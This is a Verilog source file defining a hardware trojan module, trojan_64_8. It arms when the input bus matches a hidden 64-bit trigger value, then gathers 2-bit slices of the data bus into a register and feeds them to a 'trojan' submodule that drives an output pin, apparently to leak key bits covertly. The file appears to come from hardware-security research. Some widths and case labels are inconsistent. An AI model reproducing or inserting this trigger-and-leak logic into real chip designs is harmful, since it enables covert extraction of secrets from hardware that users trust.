`timescale 1ns / 1ps
//////////////////////////////////////////////////////////////////////////////////
// Company: 
// Engineer: 
// 
// Create Date: 04/28/2023 02:33:03 PM
// Design Name: 
// Module Name: trojan_wrapper
// Project Name: 
// Target Devices: 
// Tool Versions: 
// Description: 
// 
// Dependencies: 
// 
// Revision:
// Revision 0.01 - File Created
// Additional Comments:
// 
//////////////////////////////////////////////////////////////////////////////////
//trojan function defined for leaking 2 bits at a time and all 256 bits in one go

`define bitleak 2
`define eq (4+2*`bitleak)
`define rd_dealy 3
module trojan_64_8(
input clk,rst_all,//rst_in,
input [63:0] data,
output out
    );
    

reg  en;
wire enable;
wire done;
reg [3:0] ctr;

reg [4*`bitleak-1:0] K;

wire rst = !en | done;
reg [4:0] sel;
reg [4:0] data_in;
//for en
always @(posedge clk) begin
    if(rst_all | done ) begin
        en<=0; sel<=0;
        end
    else if(data==64'h000000000044ab93) begin //for 64-bit config
    //else if(data[47:0]==48'h00000044ab93) begin  //for 48-bit config
    //else if(data[31:0]==32'h0044ab93) begin //for 32-bit config
        en<=1;
        sel<=data_in;
        end
    else begin
        en<=en; sel<=sel;
        end
    data_in<=data[4:0];
end

always @(posedge clk) begin
    if(rst_all)
        ctr<=0;
    else if (en==1'b1)
        ctr<=ctr+1;
    else
        ctr<=ctr;
end

wire [`bitleak:0] data_w = sel==0 ? data[`bitleak-1:0] : 
                           sel==1 ? data[2*`bitleak-1:`bitleak]:
                           sel==2 ? data[3*`bitleak-1:2*`bitleak]:
                           sel==3 ? data[4*`bitleak-1:3*`bitleak]:
                           sel==4 ? data[5*`bitleak-1:4*`bitleak]:
                           sel==5 ? data[6*`bitleak-1:5*`bitleak]:
                           sel==6 ? data[7*`bitleak-1:6*`bitleak]:
                           sel==7 ? data[8*`bitleak-1:7*`bitleak]:
                           sel==8 ? data[9*`bitleak-1:8*`bitleak]:
                           sel==9 ? data[10*`bitleak-1:9*`bitleak]:
                           sel==10? data[11*`bitleak-1:10*`bitleak]:
                           sel==11? data[12*`bitleak-1:11*`bitleak]:
                           sel==12? data[13*`bitleak-1:12*`bitleak]:
                           sel==13? data[14*`bitleak-1:13*`bitleak]:
                           sel==14? data[15*`bitleak-1:14*`bitleak]:
                           sel==15? data[16*`bitleak-1:15*`bitleak]:
                           sel==16? data[17*`bitleak-1:16*`bitleak]:
                           sel==17? data[18*`bitleak-1:17*`bitleak]:
                           sel==18? data[19*`bitleak-1:18*`bitleak]:
                           sel==19? data[20*`bitleak-1:19*`bitleak]:
                           sel==20? data[21*`bitleak-1:20*`bitleak]:
                           sel==21? data[22*`bitleak-1:21*`bitleak]:
                           sel==22? data[23*`bitleak-1:22*`bitleak]:
                           sel==23? data[24*`bitleak-1:23*`bitleak]:
                           sel==24? data[25*`bitleak-1:24*`bitleak]:
                           sel==25? data[26*`bitleak-1:25*`bitleak]:
                           sel==26? data[27*`bitleak-1:26*`bitleak]:
                           sel==27? data[28*`bitleak-1:27*`bitleak]:
                           sel==28? data[29*`bitleak-1:28*`bitleak]:
                           sel==29? data[30*`bitleak-1:29*`bitleak]:
                           sel==30? data[31*`bitleak-1:30*`bitleak]:
                                    data[32*`bitleak-1:31*`bitleak];
//for K 
always @(posedge clk) begin
        case(ctr)
            9'd0:  begin K[1*`bitleak-1:0*`bitleak] <=data_w; K[4*`bitleak-1:1*`bitleak]<=K[4*`bitleak-1:1*`bitleak];                      end
            9'd1:  begin K[2*`bitleak-1:1*`bitleak] <=data_w; K[4*`bitleak-1:2*`bitleak]<=K[4*`bitleak-1:2*`bitleak]; K[1*`bitleak-1:0*`bitleak] <=K[1*`bitleak-1:0*`bitleak];  end
            9'd2:  begin K[3*`bitleak-1:2*`bitleak] <=data_w; K[4*`bitleak-1:3*`bitleak]<=K[4*`bitleak-1:3*`bitleak]; K[2*`bitleak-1:0*`bitleak]<=K[2*`bitleak-1:0*`bitleak]; end
            9'd3:  begin K[4*`bitleak-1:3*`bitleak] <=data_w; K[3*`bitleak-1:0*`bitleak] <=K[3*`bitleak-1:0*`bitleak];                       end           
            default: begin  K<={data[1:0],K[4*`bitleak-1:2]}; end
        endcase
end



assign enable = (en==1'b1 && ctr>=8'd4 && !done);
assign done = (ctr==`eq);

trojan tr(.enable(enable),.K(K[1:0]),.out(out));



endmodule

